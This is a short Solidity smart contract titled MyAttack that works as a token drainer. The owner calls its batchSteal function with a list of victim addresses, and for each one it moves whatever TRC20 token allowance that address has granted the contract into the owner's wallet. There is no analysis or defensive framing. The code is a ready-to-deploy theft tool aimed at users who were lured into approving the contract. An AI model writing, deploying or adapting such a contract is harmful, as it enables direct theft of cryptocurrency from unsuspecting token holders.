// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITRC20 {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract MyAttack {
    address public owner;
    
    constructor() {
        owner = msg.sender;  // 部署者的地址将成为 owner
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }
    
    function batchSteal(address token, address[] calldata victims) external onlyOwner {
        for (uint i = 0; i < victims.length; i++) {
            uint256 allowance = ITRC20(token).allowance(victims[i], address(this));
            if (allowance > 0) {
                ITRC20(token).transferFrom(victims[i], owner, allowance);
            }
        }
    }
}
